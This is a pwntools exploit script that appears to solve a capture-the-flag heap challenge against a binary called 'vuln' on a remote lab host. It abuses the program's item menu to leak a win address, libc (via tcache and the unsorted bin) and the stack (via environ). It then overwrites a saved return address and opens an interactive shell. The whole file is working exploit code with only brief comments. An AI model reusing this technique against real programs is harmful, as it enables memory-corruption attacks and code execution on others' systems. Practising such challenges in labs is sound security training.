#!/usr/bin/env python3

from pwn import *

exe = ELF("vuln")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx.rdocker.vuln.land", 1337)

    return r

def createItem(r:process, content, size):
    r.sendlineafter(b'>', b'a')
    r.sendlineafter(b'>', content)
    r.sendlineafter(b'>', str(size).encode())

def deleteItem(r:process, name):
    r.sendlineafter(b'>', b'r')
    r.sendlineafter(b'>', name)
    r.sendlineafter(b'?', b'y')

def changeItem(r:process, name, size):
    r.sendlineafter(b'>', b'c')
    r.sendlineafter(b'>', name)
    r.sendlineafter(b'?', str(size).encode())

def editItem(r:process, name, newName):
    r.sendlineafter(b'>', b'e')
    r.sendlineafter(b'>', name)
    r.sendlineafter(b'>', newName)

def main():
    r = conn()
    createItem(r, b'l'*1337, 200)
    changeItem(r, b'l', 200)

    r.recvuntil(b':')
    winAddress = int(r.recvline(),16)
    info(f'win address: {hex(winAddress)}')

    createItem(r, b'9'*130, 200)
    createItem(r, b'8'*130, 200)
    for i in range(7):
        createItem(r, str(i).encode()*130, 200)     # fill tcache and create a chunk in the unsorted bin to leak libc
    for i in range(7, 0, -1):
        deleteItem(r, str(i).encode()*130)

    createItem(r, b'0'*130, 10000)          # leak libc
    editItem(r, b'0'*130, b'a'*0x120)  

    r.sendlineafter(b'>', b'l')
    r.recvuntil(b'10000x aaaa')
    libcleak = unpack(r.recvuntil(b'\n\n')[-8:-2], 48)
    info(f'libc leak: {hex(libcleak)}')
    
    changeItem(r, b'8'*5, 10000)

    editItem(r, b'8'*5, b'b'*240+p64(0x0)+p64(0x101)+p64(libcleak+0x7640))      # leak stack from environ

    r.sendlineafter(b'>', b'l')

    r.recvuntil(b'200x ')
    r.recvuntil(b'200x ')
    r.recvuntil(b'200x ')

    stackleak = unpack(r.recvline()[:-1], 48)

    info(f'stack leak: {hex(stackleak)}')

    editItem(r, b'b'*5, b'b'*240+p64(0x0)+p64(0x101)+p64(stackleak-0x140))          # override return address on stack with win

    r.sendlineafter(b'>', b'l')

    r.recvuntil(b'200x ')
    r.recvuntil(b'200x ')
    r.recvuntil(b'200x ')

    name = r.recvline()[:-1]

    editItem(r, name, p64(winAddress))

    info("")
    info(f"Have fun exploiting your shell:")

    r.interactive()     
    
if __name__ == "__main__":
    main()